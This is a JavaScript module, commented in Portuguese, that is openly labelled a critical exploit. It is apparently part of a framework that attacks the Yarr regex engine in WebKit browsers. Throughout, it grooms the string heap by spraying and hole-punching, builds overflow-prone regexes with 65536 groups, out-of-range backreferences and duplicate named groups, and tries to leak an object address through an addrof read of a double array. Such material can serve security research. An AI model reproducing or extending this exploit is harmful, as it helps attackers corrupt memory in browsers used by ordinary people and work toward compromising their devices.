import { Groomer } from '../mod_groomer.js';

export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Ataques ao parser/compilador Yarr sem causar ReDoS. ' +
        'O JSString Heap é fragmentado antes da compilação para forçar ' +
        'o compilador a usar rotas lentas de memória (causando o transbordo de 16-bits).',

    setup: function() {
        this.results = {};
        this.regexps = {};
        
        // A NOSSA ARMADILHA PARA O PONTEIRO
        this.addrofArray = [1.1, 2.2, 3.3, 4.4];
    },

    trigger: function() {
        // 1. Grooming Massivo do JSString Heap
        let stringTrash = Groomer.sprayStrings(64, 5000);
        Groomer.punchHoles(stringTrash, 3);

        // A: Muitos grupos de captura (ESTRANGULA O HEAP)
        try {
            const groups = '(a)'.repeat(0x10000); // 65536 grupos
            this.regexps.manyGroups = new RegExp(groups);
            this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
        } catch(e) { this.results.manyGroupsErr = e.constructor.name; }

        // B: Backreference além do limite de grupos
        try {
            this.regexps.deepBackref = new RegExp('(a)\\65536');
            this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
        } catch(e) { this.results.deepBackrefErr = e.constructor.name; }

        // C: Quantifier com valores near UINT32_MAX
        try {
            this.regexps.bigQuant = new RegExp('a{0,65535}');
            this.results.bigQuantExec = this.regexps.bigQuant.exec('')?.length;
        } catch(e) { this.results.bigQuantErr = e.constructor.name; }

        // D: Alternation com muitos branches 
        try {
            const alts = Array.from({ length: 1000 }, (_, i) => `alt${i}`).join('|');
            this.regexps.deepAlt = new RegExp(alts);
            this.results.deepAltExec = this.regexps.deepAlt.exec('alt999') ? 'matched' : 'nomatch';
        } catch(e) { this.results.deepAltErr = e.constructor.name; }

        // E: Grupos nomeados duplicados (O ALVO QUE CORROMPE)
        try {
            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
            this.results.dupNamedExec = this.regexps.dupNamed.exec('a')?.groups;
            
            // 🚨 A INJEÇÃO ADDROF:
            // Guardamos o objeto corrompido no array de doubles.
            // Se o Type Confusion bater, isto guarda o endereço de memória!
            this.addrofArray[0] = this.results.dupNamedExec;
            
        } catch(e) { this.results.dupNamedErr = e.constructor.name; }
    },

    probe: [
        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr,
        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr,
        s => s.results.bigQuantExec     ?? s.results.bigQuantErr,
        s => s.results.deepAltExec      ?? s.results.deepAltErr,
        
        // 🚨 PROBE 4: Onde o TypeError explodia antes! 
        // Agora, nós interceptamos para tentar ler o ponteiro.
        s => {
            try {
                let val = s.addrofArray[0];
                
                // Se o WebKit acha que o objeto é um número (Double), ganhámos!
                if (typeof val === 'number' && val !== 1.1) {
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const ptr = new BigUint64Array(buf)[0];
                    return `💥 SUCESSO AddrOf: 0x${ptr.toString(16).padStart(16, '0')}`;
                }
                
                // Se não transbordou neste ciclo, devolvemos apenas um aviso seguro
                // para o mod_executor.js não tentar fazer String(val) e craschar a aba à toa.
                return val ? 'Objeto protegido' : 'null/undefined';
            } catch(e) {
                return `Erro na leitura: ${e.message}`;
            }
        },

        s => { try { return s.regexps.manyGroups?.exec('a')?.[0xFFFF]; } catch(e) { return e.constructor.name; } },
        s => { try { return s.regexps.dupNamed?.exec('b')?.groups?.name; } catch(e) { return e.constructor.name; } },
    ],

    cleanup: function() {
        this.results = {};
        this.regexps = {};
        this.addrofArray = null;
    }
};
